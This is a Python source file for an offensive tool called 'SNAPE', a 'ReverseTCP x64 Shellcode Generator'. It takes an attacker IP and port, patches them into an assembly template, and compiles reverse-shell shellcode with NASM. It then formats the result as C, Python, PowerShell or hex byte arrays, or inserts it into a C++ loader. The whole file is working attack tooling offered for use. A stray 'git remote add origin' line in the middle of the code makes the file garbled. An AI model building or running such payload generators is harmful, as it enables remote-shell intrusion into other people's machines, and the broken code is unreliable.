import sys
import os
import subprocess
import tempfile
import struct
import socket

# ─── ANSI colors ─────────────────────────────────────────────────────────────
R  = '\033[0m'
B  = '\033[1m'
C  = '\033[96m'    # cyan
G  = '\033[92m'    # green
Y  = '\033[93m'    # yellow
RE = '\033[91m'    # red
M  = '\033[95m'    # magenta
DIM = '\033[2m'

def banner():
    print(f"""
{C}{C}
  ███████╗███╗   ██╗ █████╗ ██████╗ ███████╗
  ██╔════╝████╗  ██║██╔══██╗██╔══██╗██╔════╝
  ███████╗██╔██╗ ██║███████║██████╔╝█████╗
  ╚════██║██║╚██╗██║██╔══██║██╔═══╝ ██╔══╝
  ███████║██║ ╚████║██║  ██║██║     ███████╗
  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚══════╝
{C}{C}
{DIM}  ReverseTCP x64 Shellcode Generator{R}
{DIM}  by SeverusSnape{R}
""")

def find_nasm():
    paths = [
        "nasm",
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "bin", "NASM", "nasm.exe"),
        r"C:\Program Files\NASM\nasm.exe",
        r"C:\NASM\nasm.exe",
    ]
    for p in paths:
        try:
            result = subprocess.run([p, "--version"], capture_output=True, text=True)
            if result.returncode == 0:
                return p
        except FileNotFoundError:
            continue
    return None

def calc_ip_port(ip: str, port: int) -> str:
    octets = [int(x) for x in ip.split('.')]
    port_hi = (port >> 8) & 0xFF
    port_lo = port & 0xFF
    value = (
        port_hi
        | (port_lo   << 8)
        | (octets[0] << 16)
        | (octets[1] << 24)
        | (octets[2] << 32)
        | (octets[3] << 40)
    )
    return hex(value)

def compile_shellcode(nasm: str, ip: str, port: int) -> bytes:
    template_path = os.path.join(os.path.dirname(__file__), "shellcode.asm")
    with open(template_path, "r") as f:
        asm = f.read()

    ip_port_val = calc_ip_port(ip, port)
    asm = asm.replace("__IP_PORT__", ip_port_val)

    with tempfile.NamedTemporaryFile(suffix=".asm", delete=False, mode="w", encoding="utf-8") as tmp_asm:
        tmp_asm.write(asm)
        tmp_asm_path = tmp_asm.name

    tmp_bin = tmp_asm_path.replace(".asm", ".bin")

    try:
        result = subprocess.run(
            [nasm, "-f", "bin", tmp_asm_path, "-o", tmp_bin],
            capture_output=True, text=True
        )
        if result.returncode != 0:
            print(f"\n{RE}[!] NASM error:{R}\n{result.stderr}")
            sys.exit(1)
        with open(tmp_bin, "rb") as f:
            return f.read()
    finally:
        os.unlink(tmp_asm_path)
        if os.path.exists(tmp_bin):
            os.unlink(tmp_bin)

def fmt_c(sc: bytes) -> str:
    lines = []
    lines.append(f'unsigned char shellcode[] = {{')
    row = []
    for i, b in enumerate(sc):
        row.append(f'0x{b:02x}')
        if len(row) == 12 or i == len(sc) - 1:
            lines.append('    ' + ', '.join(row) + ',')
            row = []
    lines.append('};')
    lines.append(f'// size: {len(sc)} bytes')
    return '\n'.join(lines)

def fmt_python(sc: bytes) -> str:
    escaped = ''.join(f'\\x{b:02x}' for b in sc)
    lines = []
    chunk = 60
    parts = [escaped[i:i+chunk] for i in range(0, len(escaped), chunk)]
    if len(parts) == 1:
        return f'shellcode = b"{parts[0]}"  # {len(sc)} bytes'
    lines.append('shellcode = (')
    for p in parts:
        lines.append(f'    b"{p}"')
    lines.append(f')  # {len(sc)} bytes')
    return '\n'.join(lines)

def fmt_hex(sc: bytes) -> str:
    return ''.join(f'\\x{b:02x}' for b in sc)

def fmt_powershell(sc: bytes) -> str:
    hex_vals = ', '.join(f'0x{b:02x}' for b in sc)
    return f'[Byte[]] $shellcode = {hex_vals}'

def fmt_raw_hex(sc: bytes) -> str:
    return sc.hex()

def fmt_loader(sc: bytes) -> str:
    loader_template = os.path.join(os.path.dirname(__file__), "loader.cpp")
    with open(loader_template, "r") as f:
        src = f.read()
    rows = []
    row = []
    for i, b in enumerate(sc):
        row.append(f'0x{b:02x}')
        if len(row) == 12 or i == len(sc) - 1:
            rows.append('    ' + ', '.join(row) + ',')
            row = []
    bytes_str = '\n'.join(rows)
    return src.replace('    __SHELLCODE_BYTES__', bytes_str)

FORMATS = {
    '1': ('C Array',      fmt_c),
    '2': ('Python bytes', fmt_python),
    '3': ('\\x hex',      fmt_hex),
    '4': ('PowerShell',   fmt_powershell),
    '5': ('Raw hex',      fmt_raw_hex),
    '6': ('C++ Loader',   fmt_loader),
}

def choose_format() -> str:
    print(f"\n{C}{B}[?] Output format:{R}")
    for k, (name, _) in FORMATS.items():
        print(f"    {Y}{k}{R}. {name}")
    while True:
        choice = input(f"\n{G}>{R} ").strip()
        if choice in FORMATS:
            return choice
        print(f"{RE}[!] Invalid choice{R}")

def validate_ip(ip: str) -> bool:
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except ValueError:
        return False
git remote add origin
def validate_port(s: str) -> int:
    try:
        p = int(s)
        if 1 <= p <= 65535:
            return p
    except ValueError:
        pass
    return -1

def save_output(content: str, fmt_name: str, ip: str, port: int):
    ext_map = {
        'C Array': 'c', 'Python bytes': 'py',
        '\\x hex': 'txt', 'PowerShell': 'ps1', 'Raw hex': 'txt',
        'C++ Loader': 'cpp',
    }
    ext = ext_map.get(fmt_name, 'txt')
    ip_safe = ip.replace('.', '_')
    filename = f"shellcode_{ip_safe}_{port}.{ext}"
    out_path = os.path.join(os.path.dirname(__file__), filename)
    with open(out_path, 'w') as f:
        f.write(content + '\n')
    return out_path

def main():
    # Enable ANSI on Windows
    if sys.platform == 'win32':
        os.system('')

    banner()

    nasm = find_nasm()
    if not nasm:
        print(f"{RE}[!] NASM not found. Install from https://www.nasm.us/{R}")
        sys.exit(1)
    print(f"{DIM}[*] NASM: {nasm}{R}")

    # IP input
    while True:
        ip = input(f"\n{C}{B}[*]{R} Target IP   : ").strip()
        if validate_ip(ip):
            break
        print(f"{RE}[!] Invalid IP address{R}")

    # Port input
    while True:
        port_s = input(f"{C}{B}[*]{R} Target Port : ").strip()
        port = validate_port(port_s)
        if port != -1:
            break
        print(f"{RE}[!] Port must be 1-65535{R}")

    fmt_key = choose_format()
    fmt_name, fmt_fn = FORMATS[fmt_key]

    print(f"\n{Y}[~] Compiling shellcode for {B}{ip}:{port}{R}{Y}...{R}")

    sc = compile_shellcode(nasm, ip, port)

    output = fmt_fn(sc)

    print(f"{G}[+] Done! {len(sc)} bytes{R}\n")
    print(f"{DIM}{'─' * 60}{R}")
    print(output)
    print(f"{DIM}{'─' * 60}{R}\n")

    save_choice = input(f"{C}[?] Save to file? (y/N): {R}").strip().lower()
    if save_choice == 'y':
        path = save_output(output, fmt_name, ip, port)
        print(f"{G}[+] Saved: {path}{R}")

    print()

if __name__ == '__main__':
    main()
